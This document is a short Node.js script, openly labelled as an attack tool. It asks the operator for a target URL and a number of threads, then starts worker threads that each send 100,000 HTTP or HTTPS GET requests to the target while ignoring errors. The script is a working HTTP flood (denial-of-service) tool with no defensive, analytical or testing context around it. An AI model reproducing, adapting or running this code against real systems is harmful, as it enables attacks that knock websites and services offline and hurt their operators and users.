const http = require('http');
const https = require('https');
const readline = require('readline');
const url = require('url');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

// Create interface for reading input from the console
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

if (isMainThread) {
  // Main thread: Prompt user for input and start workers
  rl.question('Enter target URL (e.g., http://example.com): ', (targetUrl) => {
    rl.question('Enter the number of threads: ', (threads) => {
      const threadCount = parseInt(threads, 10);

      if (isNaN(threadCount)) {
        console.error('Invalid number of threads');
        rl.close();
        return;
      }

      console.log(`Starting attack with ${threadCount} threads, each sending 100,000 requests.`);

      // Start the specified number of threads
      for (let i = 0; i < threadCount; i++) {
        new Worker(__filename, {
          workerData: {
            targetUrl,
            requestsPerThread: 50000 // Each thread sends 50,000 requests twice
          }
        });
      }

      rl.close();
    });
  });
} else {
  // Worker thread: Perform the attack
  const { targetUrl, requestsPerThread } = workerData;
  const parsedUrl = url.parse(targetUrl);
  const protocol = parsedUrl.protocol === 'https:' ? https : http;
  let requestCount = 0;

  const sendRequest = () => {
    return new Promise((resolve) => {
      const options = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (protocol === https ? 443 : 80),
        path: parsedUrl.path,
        method: 'GET'
      };

      const req = protocol.request(options, (res) => {
        res.on('data', () => {});
        res.on('end', () => {});
      });

      req.on('error', (err) => {
        // Ignore errors as they are expected
      });

      req.end(() => {
        requestCount++;
        resolve();
      });
    });
  };

  const runAttack = async () => {
    const requestPromises = [];

    // Send 50,000 requests twice (100,000 requests total per thread)
    for (let i = 0; i < requestsPerThread * 2; i++) {
      requestPromises.push(sendRequest());
    }

    await Promise.all(requestPromises);
    console.log(`Thread finished. Total requests sent: ${requestCount}`);
  };

  runAttack();
}
